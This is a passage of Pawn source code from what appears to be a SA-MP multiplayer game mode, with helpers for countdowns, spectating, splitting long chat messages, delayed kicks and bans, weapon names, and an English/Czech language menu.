		    GameTextForPlayer(i, "~g~START", 1000, 5);
		    PlayerPlaySound(i, 1057, 0.0, 0.0, 10.0);
			TogglePlayerControllable(i,1);
		}
		Count = -1;
	}
	return true;
}
stock CountDown(time)
{
	new str[10];
	format(str, 10, "%d", time);
    for(new i = 0; i < MAX_PLAYERS; i++)
		GameTextForPlayer(i, str, 1000, 5);
    Count = time - 1;
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if (team[i] != spec)
	    {
			TogglePlayerControllable(i,0);
		}
	}
	SetTimer("CountDownPublic", 1000, false);
}

stock lowestplayer()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
		if (team[i] != spec)
			return i;

	return -1;
}

stock specplayer(playerid, otherid)
{
	TogglePlayerSpectating(playerid, 1);
	PlayerSpectatePlayer(playerid, otherid);
	SetPlayerInterior(playerid,GetPlayerInterior(otherid));
	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(otherid));
	return 1;
}

stock SendLongMessage(playerid, color, const message[])
{
    new length = strlen(message);
    if (length <= 72)
        return SendClientMessage(playerid, color, message);

    new chatLine[2][73];
    strmid(chatLine[0], message, 0, 72);
    strmid(chatLine[1], message, 72, min(144, length));
    SendClientMessage(playerid, color, chatLine[0]);
    return SendClientMessage(playerid, color, chatLine[1]);
}

stock SendLongMessageToAll(color, const message[])
{
    new length = strlen(message);
    if (length <= 72)
        return SendClientMessageToAll(color, message);

    new chatLine[2][73];
    strmid(chatLine[0], message, 0, 72);
    strmid(chatLine[1], message, 72, min(144, length));
    SendClientMessageToAll(color, chatLine[0]);
    return SendClientMessageToAll(color, chatLine[1]);
}

forward BanPublic(playerid);
public BanPublic(playerid)
{
  Ban(playerid);
}

stock BanPersonWithDelay(playerid)
{
  SetTimerEx("BanPublic", 1000, 0, "d", playerid);     //Delay of 1 second before kicking the player so he recieves the message
}

forward KickPublic(playerid);
public KickPublic(playerid)
{
  Kick(playerid);
}

stock KickPersonWithDelay(playerid)
{
    SetTimerEx("KickPublic", 2000, 0, "d", playerid);     //Delay of 1 second before kicking the player so he recieves the message
    return 1;
}

stock GetWeaponNameByID(wid)
{
    new gunname[32];
    switch (wid)
    {
        case    1 .. 17,
                22 .. 43,
                46 :        GetWeaponName(wid,gunname,sizeof(gunname));
        case    0:          format(gunname,32,"%s","Fist");
        case    18:         format(gunname,32,"%s","Molotov Cocktail");
        case    44:         format(gunname,32,"%s","Night Vis Goggles");
        case    45:         format(gunname,32,"%s","Thermal Goggles");
        default:            format(gunname,32,"%s","Invalid Weapon Id");

    }
    return gunname;
}

forward RespawnSpec(i, playerid);
public RespawnSpec(i, playerid)
{
	PlayerSpectatePlayer(i, playerid);
}

stock ShowPlayerSelectLangDialog(playerid)
{
	new caption[64];
	if (GetPlayerLanguage(playerid) == LANGUAGE_ENGLISH)
		caption = "Choose your language";
	else
		caption = "Vyber si jazyk";

	return ShowPlayerDialog(playerid, DIALOG_SELECT_LANG, DIALOG_STYLE_LIST, caption, "English\nCzech", "Choose", "");
}

Languages_OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    #pragma unused inputtext
    if (response && dialogid == DIALOG_SELECT_LANG)
    {
        SetPlayerLanguage(playerid, E_LANGUAGE:listitem);
        return 1;
    }
    return 0;
}
